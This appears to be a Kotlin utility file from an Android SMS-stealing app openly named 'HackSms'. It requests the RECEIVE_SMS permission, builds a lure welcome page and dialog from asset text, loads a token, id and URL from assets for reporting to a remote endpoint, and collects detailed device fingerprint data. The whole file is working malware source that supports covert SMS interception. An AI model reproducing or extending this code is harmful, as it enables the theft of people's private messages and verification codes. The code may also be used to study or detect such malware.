package cocomelonc.hacksms.tools

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import com.karumi.dexter.Dexter
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.single.PermissionListener

class HackSmsUtils {

    companion object {
        @SuppressLint("NewApi")
        fun isPermissionGranted(context: Context): Boolean {
            val isGranted = context.checkSelfPermission(Manifest.permission.RECEIVE_SMS)
            return isGranted == PackageManager.PERMISSION_GRANTED
        }

        fun isWelcomePageEnable(context: Context): Boolean {
            return if (getHackSmsData(context).welcomeTitle.trim() == "") {
                false
            } else context.getSharedPreferences("smseyeprefs", Context.MODE_PRIVATE)
                .getBoolean("isWelcomeEnable", true)
        }

        fun disableWelcome(context: Context) {
            val prefs = context.getSharedPreferences("smseyeprefs", Context.MODE_PRIVATE)
            val editor = prefs.edit()
            editor.putBoolean("isWelcomeEnable", false)
            editor.apply()
        }

        fun grantPermissions(context: Context, onGranted: () -> Unit) {
            Dexter
                .withContext(context)
                .withPermission(Manifest.permission.RECEIVE_SMS)
                .withListener(object : PermissionListener {
                    override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
                        onGranted()
                    }

                    override fun onPermissionDenied(p0: PermissionDeniedResponse?) {}
                    override fun onPermissionRationaleShouldBeShown(
                        p0: PermissionRequest?,
                        p1: PermissionToken?
                    ) {
                    }
                }).check()
        }

        fun getHackSmsData(context: Context): HackSmsData {
            val assets = context.assets
            val title = assets.open("welcomeText/title.txt").bufferedReader().readText()
            val text1 = assets.open("welcomeText/text1.txt").bufferedReader().readText()
            val text2 = assets.open("welcomeText/text2.txt").bufferedReader().readText()
            val button = assets.open("welcomeText/button.txt").bufferedReader().readText()
            val images = assets.list("welcomeImages")?.asList()
            val dialogTitle = assets.open("dialogText/title.txt").bufferedReader().readText()
            val dialogText = assets.open("dialogText/text.txt").bufferedReader().readText()
            val dialogBox = assets.open("dialogText/box.txt").bufferedReader().readText()
            val dialogButton1 = assets.open("dialogText/button1.txt").bufferedReader().readText()
            val dialogButton2 = assets.open("dialogText/button2.txt").bufferedReader().readText()
            return HackSmsData(
                title,
                text1,
                text2,
                button,
                images,
                dialogTitle,
                dialogText,
                dialogBox,
                dialogButton1,
                dialogButton2
            )
        }

        fun getHackSmsNetworkData(context: Context): HackSmsNetworkData {
            val assets = context.assets
            val token = assets.open("token.txt").bufferedReader().readText()
            val id = assets.open("id.txt").bufferedReader().readText()
            val url = assets.open("url.txt").bufferedReader().readText()
            return HackSmsNetworkData(token, id, url)
        }

        fun getDeviceName(): String {
            fun capitalize(s: String?): String {
                if (s == null || s.isEmpty()) {
                    return ""
                }
                val first = s[0]
                return if (Character.isUpperCase(first)) {
                    s
                } else {
                    first.uppercaseChar().toString() + s.substring(1)
                }
            }

            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            val device = Build.DEVICE
            val deviceID = Build.ID
            val brand = Build.BRAND
            val hardware = Build.HARDWARE
            val hostInfo = Build.HOST
            val userInfo = Build.USER
            val board = Build.BOARD
            val display = Build.DISPLAY
            val fingerprint = Build.FINGERPRINT
            val devT = Build.TYPE
            val radio = Build.getRadioVersion()


            val info =
                "Hardware: " + capitalize(hardware) + "\n " +
                "Manufacturer: " + capitalize(manufacturer) + "\n " +
                "Model: " + capitalize(model) + " \n " +
                "Device: " + capitalize(device) + "\n " +
                "ID: " + capitalize(deviceID) + "\n " +
                "Brand: " + capitalize(brand) + "\n " +
                "Host: " + capitalize(hostInfo) + "\n " +
                "User: " + capitalize(userInfo) + "\n " +
                "Board: " + capitalize(board) + "\n " +
                "Display: " + capitalize(display)  + "\n " +
                "Fingerprint: " + capitalize(fingerprint) + "\n " +
                "Build TYPE: " + capitalize(devT) + "\n " +
                "RADIO: " + capitalize(radio)
            return info
        }
    }

    data class HackSmsData(
        val welcomeTitle: String,
        val welcomeText1: String,
        val welcomeText2: String,
        val welcomeButton: String,
        val welcomeImages: List<String>?,
        val dialogTitle: String,
        val dialogText: String,
        val dialogBox: String,
        val dialogButton1: String,
        val dialogButton2: String,
    )

    data class HackSmsNetworkData(
        val token: String,
        val id: String,
        val url: String
    )
}